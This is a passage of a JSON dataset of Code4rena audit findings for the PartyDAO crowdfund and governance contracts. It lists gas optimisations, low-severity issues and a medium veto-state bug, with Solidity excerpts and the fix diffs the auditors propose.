      "content": "Gas saved: 1365 per tx\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..68ccf4e 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -352,14 +352,15 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n         uint96 minContribution_ = minContribution;\n         uint96 maxContribution_ = maxContribution;\n         for (uint256 i; i < votingPowerByCard.length; ++i) {\n-            if (votingPowerByCard[i] == 0) continue;\n+            uint96 vp = votingPowerByCard[i];\n+            if (vp == 0) continue;\n \n             // Check that the contribution equivalent of voting power is within\n             // contribution range. This is done so parties may use the minimum\n             // and maximum contribution values to limit the voting power of each\n             // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance\n             // system where each card has equal voting power).\n-            uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;\n+            uint96 contribution = (vp * 1e4) / exchangeRateBps;\n             if (contribution < minContribution_) {\n                 revert BelowMinimumContributionsError(contribution, minContribution_);\n             }\n@@ -371,9 +372,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n             votingPower -= votingPowerByCard[i];\n \n             // Mint contributor a new party card.\n-            uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);\n+            uint256 tokenId = party.mint(contributor, vp, delegate);\n \n-            emit Claimed(contributor, tokenId, votingPowerByCard[i]);\n+            emit Claimed(contributor, tokenId, vp);\n         }\n \n         // Requires that all voting power is claimed because the contributor is\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20013",
      "title": "[G-03] Cache `party` in memory variable",
      "impact": "GAS",
      "content": "`party` is used multiple times so it can be cached in a memory variable.\n\nGas saved: 149 per tx\n\n```diff\ndiff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol\nindex 8ab3b5c..159e30a 100644\n--- a/contracts/crowdfund/InitialETHCrowdfund.sol\n+++ b/contracts/crowdfund/InitialETHCrowdfund.sol\n@@ -325,15 +325,16 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n         }\n \n         // Get amount to refund.\n-        uint96 votingPower = party.votingPowerByTokenId(tokenId).safeCastUint256ToUint96();\n+        Party party_ = party;\n+        uint96 votingPower = party_.votingPowerByTokenId(tokenId).safeCastUint256ToUint96();\n         amount = _calculateRefundAmount(votingPower);\n \n         if (amount > 0) {\n             // Get contributor to refund.\n-            address payable contributor = payable(party.ownerOf(tokenId));\n+            address payable contributor = payable(party_.ownerOf(tokenId));\n \n             // Burn contributor's party card.\n-            party.burn(tokenId);\n+            party_.burn(tokenId);\n \n             // Refund contributor.\n             contributor.transferEth(amount);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20012",
      "title": "[G-02] No need to cache `fundingSplitRecipient` in memory variable",
      "impact": "GAS",
      "content": "`fundingSplitRecipient` is only used once. So it is not beneficial to cache it in a memory variable.  \n\nGas saved: Negligible but code is simplified\n\n```diff\ndiff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol\nindex 4392655..17af949 100644\n--- a/contracts/crowdfund/ETHCrowdfundBase.sol\n+++ b/contracts/crowdfund/ETHCrowdfundBase.sol\n@@ -222,9 +222,8 @@ contract ETHCrowdfundBase is Implementation {\n         }\n \n         // Subtract fee from contribution amount if applicable.\n-        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n         uint16 fundingSplitBps_ = fundingSplitBps;\n-        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n+        if (fundingSplitRecipient != address(0) && fundingSplitBps_ > 0) {\n             uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;\n             amount -= feeAmount;\n         }\n@@ -237,9 +236,8 @@ contract ETHCrowdfundBase is Implementation {\n         amount = (votingPower * 1e4) / exchangeRateBps;\n \n         // Add back fee to contribution amount if applicable.\n-        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n         uint16 fundingSplitBps_ = fundingSplitBps;\n-        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n+        if (fundingSplitRecipient != address(0) && fundingSplitBps_ > 0) {\n             amount = (amount * 1e4) / (1e4 - fundingSplitBps_);\n         }\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20011",
      "title": "[G-01] Use `maxTotalContributations_` memory variable instead of `maxTotalContributions`",
      "impact": "GAS",
      "content": "`maxTotalContributions` has already been saved to the `maxTotalContributions_` memory variable.<br>\nIt's cheaper to read from memory than from storage.  \n\nGas saved: 124 Gas per tx\n\n```diff\ndiff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol\nindex 4392655..886c09c 100644\n--- a/contracts/crowdfund/ETHCrowdfundBase.sol\n+++ b/contracts/crowdfund/ETHCrowdfundBase.sol\n@@ -212,7 +212,7 @@ contract ETHCrowdfundBase is Implementation {\n             _finalize(maxTotalContributions_);\n \n             // Refund excess contribution.\n-            uint96 refundAmount = newTotalContributions - maxTotalContributions;\n+            uint96 refundAmount = newTotalContributions - maxTotalContributions_;\n             if (refundAmount > 0) {\n                 amount -= refundAmount;\n                 payable(msg.sender).transferEth(refundAmount);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20010",
      "title": "[N-04] Check that none of the `authorities` is zero address",
      "impact": "LOW",
      "content": "The [`PartyFactory.createParty`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyFactory.sol#L18-L45) function should check that the `authorities` array contains addresses that are not the zero address.  \n\nI mention this because in the previous version of the `PartyFactory` contract, there was only one `authority` and it was checked to not be the zero address such as to ensure that governance NFTs can be minted:  \n\n[Link](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/party/PartyFactory.sol#L33-L35)  \n```solidity\nif (authority == address(0)) {\n    revert InvalidAuthorityError(authority);\n}\n```\n\nHowever now it is only checked that the `authorities` array is not empty:  \n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyFactory.sol#L26-L28)  \n```solidity\nif (authorities.length == 0) {\n    revert NoAuthorityError();\n}\n```\n\nI think you should check that there is no zero address in this array. The current check is not sufficient when compared to what has been checked previously. The current check is weaker.  \n\n**[0xble (Party) confirmed](https://github.com/code-423n4/2023-04-party-findings/issues/14#issuecomment-1515456383)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20009",
      "title": "[N-03] Use `transferEth` instead of `transfer` for transferring ETH",
      "impact": "LOW",
      "content": "The [automated findings](https://gist.github.com/HollaDieWaldfee100/673ab665890ab92d5f3f82c8736ffea5#L-2) have flagged the below instances as unsafe ERC20 operations.  \n\nThis is wrong. They are not ERC20 operations. Instead they are just the `transfer` function that is a built-in Solidity function for sending ETH.  \n\nHowever the usage of this function is still [discouraged](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) because it limits the Gas that the callee can consume to `2300`.  \n\nInstead use the `transferEth` function that is used elsewhere in the codebase to transfer ETH.  \n\nThere are 4 instances:  \n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L204](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L204)  \n\n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L267](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L267)  \n\n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L152](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L152)  \n\n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L201](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L201)  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20008",
      "title": "[N-02] `OperationExecuted` event is defined but never emitted",
      "impact": "LOW",
      "content": "In the `OperatorProposal` contract the [`OperationExecuted`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L20) event is defined but it is never emitted.  \n\nTherefore I recommend to emit this event when the operation is executed successfully.  \n\nFix:  \n```diff\ndiff --git a/contracts/proposals/OperatorProposal.sol b/contracts/proposals/OperatorProposal.sol\nindex 23e2897..5899bec 100644\n--- a/contracts/proposals/OperatorProposal.sol\n+++ b/contracts/proposals/OperatorProposal.sol\n@@ -44,6 +44,8 @@ contract OperatorProposal {\n         // Execute the operation.\n         data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);\n \n+        emit OperationExecuted(msg.sender);\n+        \n         // Nothing left to do.\n         return \"\";\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20007",
      "title": "[N-01] Introduce separate `vetoThresholdBps` for vetoing a proposal",
      "impact": "LOW",
      "content": "Currently the same [`passThresholdBps`](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/party/PartyGovernance.sol#L81) variable is used for accepting proposals as well as vetoing proposals.  \n\n`passTresholdBps` is a percentage of the `totalVotingPower` that is required.  \n\nI recommend to introduce a separate `vetoThresholdBps` governance parameter that is used to determine the percentage of votes necessary to veto a proposal.  \n\nUsing separate thresholds allows for greater flexibility.  \n\nE.g. a Party might want a high consensus of 60% to accept a proposal but might want to require only 10% of votes to veto a proposal. Such a setup is not possible currently which unnecessarily restricts the flexibility of the protocol.  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20006",
      "title": "[L-07] Allow specifying `maximumPrice` for individual NFTs",
      "impact": "LOW",
      "content": "Currently it is only possible to specify a single `maximumPrice` for all NFTs in the `CollectionBatchBuyOperator` contract ([Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L25-L26)).  \n\nI recommend that it should be possible to specify a `maximumPrice` for each NFT individually. Thereby it's possible for the party to enforce tighter limits to the amount of ETH that the executor can spend.  \n\nFor example the NFT with `id=1` might require a maximum price of `1 ETH` whereas for another NFT with `id=2` a maximum price of `0.1 ETH` can be sufficient.  \n\nCurrently both NFTs can only have the same maximum price and the executor is able to spend `2 ETH` at a maximum. This could be further restricted to minimize the trust that needs to be put into the executor.  \n\nThis can be implemented by introducing a new `mapping(uint256 => uint256) maximumPrices` mapping. If the entry for an NFT is `!= 0` it should be used as the maximum price. Otherwise `maximumPrice` can be used as a fallback.  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20005",
      "title": "[L-06] Use `uint256` for computations such that voting power can be all values in `uint96` range",
      "impact": "LOW",
      "content": "The voting power in a party is managed in `uint96` variables.  \n\nWhen we look at the `PartyGovernance._areVotesPassing` function we can see that for the computation the `uint96` variables are cast to `uint256`:  \n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1048-L1054)  \n```solidity\nfunction _areVotesPassing(\n    uint96 voteCount,\n    uint96 totalVotingPower,\n    uint16 passThresholdBps\n) private pure returns (bool) {\n    return (uint256(voteCount) * 1e4) / uint256(totalVotingPower) >= uint256(passThresholdBps);\n}\n```\n\nThis is done such that there is no intermediate overflow. If there was no cast, the multiplication `voteCount * 1e4` could overflow and cause a DOS to the Party when `voteCount` is close to `type(uint96).max = ~ 7.9e28`.  \n\nThe issue is in the `PartyGovernance._isUnanimousVotes` function which does not convert the voting power to `uint256` and is therefore prone to overflow:  \n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1037-L1046)  \n```solidity\nfunction _isUnanimousVotes(\n    uint96 totalVotes,\n    uint96 totalVotingPower\n) private pure returns (bool) {\n    uint256 acceptanceRatio = (totalVotes * 1e4) / totalVotingPower;\n    // If >= 99.99% acceptance, consider it unanimous.\n    // The minting formula for voting power is a bit lossy, so we check\n    // for slightly less than 100%.\n    return acceptanceRatio >= 0.9999e4;\n}\n```\n\nAs long as the mint authorities ensure that the number of votes stays within the safe range (`7.9e28 / 1e4 = ~7.9e24`) this is not a poblem. However the way the `_areVotesPassing` function works shows that the whole `uint96` range should be safe.  \n\nTherefore I propose the following change to the `_isUnanimousVotes` function:  \n\n```diff\ndiff --git a/contracts/party/PartyGovernance.sol b/contracts/party/PartyGovernance.sol\nindex e251646..7571fa8 100644\n--- a/contracts/party/PartyGovernance.sol\n+++ b/contracts/party/PartyGovernance.sol\n@@ -1038,7 +1038,7 @@ abstract contract PartyGovernance is\n         uint96 totalVotes,\n         uint96 totalVotingPower\n     ) private pure returns (bool) {\n-        uint256 acceptanceRatio = (totalVotes * 1e4) / totalVotingPower;\n+        uint256 acceptanceRatio = (uint256(totalVotes) * 1e4) / uint256(totalVotingPower);\n         // If >= 99.99% acceptance, consider it unanimous.\n         // The minting formula for voting power is a bit lossy, so we check\n         // for slightly less than 100%.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20004",
      "title": "[L-05] Attacker can decide how voting power is distributed across party cards (griefing attack)",
      "impact": "LOW",
      "content": "In the `ReraiseETHCrowdfund` contract the party cards are not minted immediately.<br>\nThe user first gets a crowdfund NFT and later when the crowdfund is won the voting power can be \"claimed\" which means the actual party cards are minted.  \n\nVoting power is claimed with the [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303) or [`ReraiseETHCrowdfund.claimMultiple`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382) function.  \n\nThe issue arises from the fact that any User A can claim the party cards of any other User B.<br>\nAnd User A can also decide how the voting power is distributed across party cards (within the limits set in the contract).  \n\nAlso party cards cannot be reorganized. When a party card has voting power 10 it has voting power 10 forever. It is not possible to divide this party card into two party cards with voting power 5 each.<br>\nSimilarly two party cards cannot be merged into one.  \n\nFrom the above observations we can understand how this leads to a problem: A User A may want to have 10 party cards with 1 voting power each so he can transfer them individually if needed. The attacker can do a griefing attack and claim 1 party card with voting power 10 so the party card cannot be used as intended.  \n\nThe sponsor explained that it is important that anyone can claim party cards so this is not something we can restrict.  \n\nAlso I have been told that they have considered for while to allow reorganizing party cards.<br>\nTherefore I encourage them to actually implement reorganizing party cards.  \n\nThereby it is ensured that if this griefing attack occurs a user can reorganize his party cards and use them as intended.  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20003",
      "title": "[L-04] Use `delegationsByContributor[contributor]` instead of `delegate` when minting party card",
      "impact": "LOW",
      "content": "The `ÌnitialETHCrowdfund._contribute` function currently uses `delegate` as the delegate when minting a party card [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L302).  \n\nThis is wrong. Instead `delegationsByContributor[contributor]` should be used. This is because if User A contributes for another User B and User B has already set a delegate, i.e. `delegationsByContributor[contributor]!=address(0)` then this delegate should be used and not the `delegate` parameter supplied by User A.  \n\nHowever I don't see any impact in this behavior because if `delegationsByContributor[contributor]!=address(0)` then the party also has a delegate set for the `contributor`. And so this delegate is used above the delegate from the crowdfund anyway. So this finding is Low severity at most.  \n\nFix:  \n```diff\ndiff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol\nindex 8ab3b5c..6c76e88 100644\n--- a/contracts/crowdfund/InitialETHCrowdfund.sol\n+++ b/contracts/crowdfund/InitialETHCrowdfund.sol\n@@ -299,7 +299,7 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n \n         if (tokenId == 0) {\n             // Mint contributor a new party card.\n-            party.mint(contributor, votingPower, delegate);\n+            party.mint(contributor, votingPower, delegationsByContributor[contributor]);\n         } else if (disableContributingForExistingCard) {\n             revert ContributingForExistingCardDisabledError();\n         } else if (party.ownerOf(tokenId) == contributor) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20002",
      "title": "[L-03] Issue due to rounding from previous C4 audit is still present in new crowdfund contracts",
      "impact": "LOW",
      "content": "In the previous C4 audit an issue has been found that due to rounding it might not be possible to achieve an unanimous vote:  \n\n[https://code4rena.com/reports/2022-09-party/#m-10-possible-that-unanimous-votes-is-unachievable](https://code4rena.com/reports/2022-09-party/#m-10-possible-that-unanimous-votes-is-unachievable)\n\nThe issue also exists in the new crowdfund contracts (`InitialETHCrowdfund`, `ReraiseETHCrowdfund`).  \n\nI agree that it would be best to introduce the fix suggested by the warden in the old report.  \n\nHowever the sponsor told me that the `minContribution` amount will be set large enough such that the rounding issue cannot occur.  \n\nTherefore I don't think this issue is worth reporting as Medium in this audit again. But I'd like to bring it up because it's still present in the new contracts.  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20001",
      "title": "[L-02] Comments state that pre-existing ETH can be used but it can't",
      "impact": "LOW",
      "content": "It is possible to provide an initial contribution to the `ReraiseETHCrowdfund` and `InitialETHCrowdfund` contracts.  \n\nThe initial contribution is processed when the `initialize` function is called.  \n\nIn both contracts it is stated that pre-existing ETH is used for the initial contribution (i.e. ETH that is owned by the contract but not sent along with the call to the `initialize` function):  \n\n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L118-L131](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L118-L131)  \n\n[https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L80-L87](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L80-L87)  \n\nHowever the initial contribution is only measured by looking at `msg.value`:  \n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L120)  \n```solidity\nuint96 initialContribution = msg.value.safeCastUint256ToUint96();\n```\n\nThis means that pre-existing ETH is not actually processed and just sits in the contract without being used for anything. It can't even be rescued.  \n\nIt was assessed with the sponsor that they don't actually want to allow pre-existing ETH to be used for the initial contribution.  \n\nTherefore the comments should be removed so users don't make a mistake and lose their ETH.  \n\nFix:  \n```diff\ndiff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol\nindex 8ab3b5c..bcc65e2 100644\n--- a/contracts/crowdfund/InitialETHCrowdfund.sol\n+++ b/contracts/crowdfund/InitialETHCrowdfund.sol\n@@ -115,12 +115,9 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {\n             })\n         );\n \n-        // If the deployer passed in some ETH during deployment, credit them\n-        // for the initial contribution.\n         uint96 initialContribution = msg.value.safeCastUint256ToUint96();\n         if (initialContribution > 0) {\n-            // If this contract has ETH, either passed in during deployment or\n-            // pre-existing, credit it to the `initialContributor`.\n+            // credit msg.value to the `initialContributor`.\n             _contribute(\n                 crowdfundOpts.initialContributor,\n                 crowdfundOpts.initialDelegate,\n```\n\n```diff\ndiff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol\nindex 580623d..6ad81fc 100644\n--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol\n+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol\n@@ -77,12 +77,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {\n             0 // Ignored. Will use customization preset from party.\n         );\n \n-        // If the deployer passed in some ETH during deployment, credit them\n-        // for the initial contribution.\n         uint96 initialContribution = msg.value.safeCastUint256ToUint96();\n         if (initialContribution > 0) {\n-            // If this contract has ETH, either passed in during deployment or\n-            // pre-existing, credit it to the `initialContributor`.\n+            // credit msg.value to the `initialContributor`.\n             _contribute(opts.initialContributor, opts.initialDelegate, initialContribution, \"\");\n         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "20000",
      "title": "[L-01] ETH is not refunded when `allowArbCallsToSpendPatyETH=true`",
      "impact": "LOW",
      "content": "The `ArbitraryCallsProposal` contract does not refund `ETH` to the `msg.sender` if `allowArbCallsToSpendPartyEth=true`.  \n\nIt only refunds when `allowArbCallsToSpendPartyEth=false`:  \n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/ArbitraryCallsProposal.sol#L108-L110)  \n```solidity\nif (!allowArbCallsToSpendPartyEth && ethAvailable > 0) {\n    payable(msg.sender).transferEth(ethAvailable);\n}\n```\n\nThe reason this is the case is that it is not expected that the `msg.sender` will provide `ETH` if it is allowed to spend `ETH` from the Party's balance.  \n\nI don't think this is a good assumption. There should be a refund mechanism.  \n\nPlease also refer to my report `#5` which discusses a more severe similar issue. Some of the reasoning there also applies here. Specifically that there are two broad options to implement refunds when `allowArbCallsToSpendPartyEth=true`.  \n\n1. Use `msg.value` first\n2. Use Party balance first\n\nThe sponsor needs to decide which policy (if any) to use.  \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2023-04-party",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "19999",
      "title": "[M-12] `VetoProposal`: proposals cannot be vetoed in all states in which it should be possible to veto proposals",
      "impact": "MEDIUM",
      "content": "\nThe [`VetoProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69) contract allows to veto proposals with the [`voteToVeto`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60) function.\n\nThe proposal can only be vetoed when it is in the `Voting` state, otherwise the `voteToVeto` function reverts.\n\nThe issue is that the `Voting` state is not the only state in which it should be possible to veto the proposal. It should also be possible to veto the proposal in the `Passed` and `Ready` states.\n\n(We can see this by looking at the downstream [`PartyGovernance.veto`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L617-L637) function)\n\nIt has been confirmed to me by the sponsor that the `voteToVeto` function should not restrict the situations in which vetos can occur.\n\nThe impact of this issue is that the situations in which vetos can occur is more limited than it should be. Users should have the ability to veto proposals even in the `Passed` and `Ready` states but they don't.\n\n### Proof of Concept\n\nBy looking at the `VetoProposal.voteToVeto` function we see that it's only possible to call the function when the proposal is in the `Voting` state. Otherwise the function reverts:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L28-L34)\n\n```solidity\n// Check that proposal is active\n(\n    PartyGovernance.ProposalStatus proposalStatus,\n    PartyGovernance.ProposalStateValues memory proposalValues\n) = party.getProposalStateInfo(proposalId);\nif (proposalStatus != PartyGovernance.ProposalStatus.Voting)\n    revert ProposalNotActiveError(proposalId);\n```\n\nBut when we look at the `PartyGovernance.veto` function which is called downstream and which implements the actual veto functionality (the `VetoProposal.voteToVeto` function is only a wrapper) we can see that it allows vetoing in the `Voting`, `Passed` and `Ready` states:\n\n[Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L617-L637)\n\n```solidity\nfunction veto(uint256 proposalId) external onlyHost onlyDelegateCall {\n    // Setting `votes` to -1 indicates a veto.\n    ProposalState storage info = _proposalStateByProposalId[proposalId];\n    ProposalStateValues memory values = info.values;\n\n\n    {\n        ProposalStatus status = _getProposalStatus(values);\n        // Proposal must be in one of the following states.\n        if (\n            status != ProposalStatus.Voting &&\n            status != ProposalStatus.Passed &&\n            status != ProposalStatus.Ready\n        ) {\n            revert BadProposalStatusError(status);\n        }\n    }\n\n\n    // -1 indicates veto.\n    info.values.votes = VETO_VALUE;\n    emit ProposalVetoed(proposalId, msg.sender);\n}\n```\n\nTherefore we can see that the `VetoProposal.voteToVeto` function restricts the vetoing functionality too much.\n\nUsers are not able to veto in the `Passed` and `Ready` states even though it should be possible.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe issue can be fixed by allowing the `VetoProposal.voteToVeto` function to be called in the `Passed` and `Ready` states as well.\n\nFix:\n\n```diff\ndiff --git a/contracts/proposals/VetoProposal.sol b/contracts/proposals/VetoProposal.sol\nindex 780826f..38410f6 100644\n--- a/contracts/proposals/VetoProposal.sol\n+++ b/contracts/proposals/VetoProposal.sol\n@@ -30,7 +30,11 @@ contract VetoProposal {\n             PartyGovernance.ProposalStatus proposalStatus,\n             PartyGovernance.ProposalStateValues memory proposalValues\n         ) = party.getProposalStateInfo(proposalId);\n-        if (proposalStatus != PartyGovernance.ProposalStatus.Voting)\n+        if (\n+            proposalStatus != PartyGovernance.ProposalStatus.Voting\n+            && proposalStatus != PartyGovernance.ProposalStatus.Passed\n+            && proposalStatus != PartyGovernance.ProposalStatus.Ready\n+           )\n             revert ProposalNotActiveError(proposalId);\n```\n\n**[0xble (Party) confirmed and commented via duplicate issue `#20`](https://github.com/code-423n4/2023-04-party-findings/issues/20#issuecomment-1515437523):**\n> This is valid, proposals should be allowed to be vetoed even after they've passed but have not yet been executed.\n\n\n\n***\n\n",
